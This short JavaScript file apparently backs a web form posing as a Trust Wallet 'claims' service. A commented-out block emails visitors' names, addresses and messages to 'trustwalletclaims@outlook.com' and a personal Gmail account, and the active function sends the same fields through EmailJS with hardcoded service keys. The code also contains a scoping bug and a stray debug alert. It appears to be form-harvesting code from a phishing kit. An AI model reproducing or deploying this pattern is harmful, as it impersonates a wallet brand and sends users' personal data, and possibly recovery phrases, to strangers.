// const btn = document.querySelector('button');
// const inputs = document.querySelector('form');
// btn.addEventListener('click', () => {
//     Email.send({
//         SecureToken: "7c0e8619-a1b4-4b8f-8e4b-65fb83f1946c",
//         To: "trustwalletclaims@outlook.com, horladjosh@gmail.com",
//         From: inputs.elements["email"].value,
//         Subject: "Response by Customer",
//         Body: inputs.elements["message"].value + "<br>" + inputs.elements["email"].value + "<br>" +
//             inputs.elements["name"].value
//     }).then(msg => alert("Your claim request has been successfully received!"))
// })


function sendMail(e) {
    e.preventDefault()
    var tempParams = {
        from_name: document.getElementById("name").value,
        // to_name: document.getElementById("email").value,
        message: document.getElementById("msg").value,
    };
    emailjs.send('service_00ui67j', 'template_mvmqwfi', tempParams, 'user_UYKI72Q35QSYVNWdrhB7R').then(function(res) {
        console.log("success", res.status, res.text)
        alert("Message has been sent")
    }, function(err) {
        console.log(err)
    })
    console.log("success", res.status)
    alert('Heeyyyyyyyyyyy')
}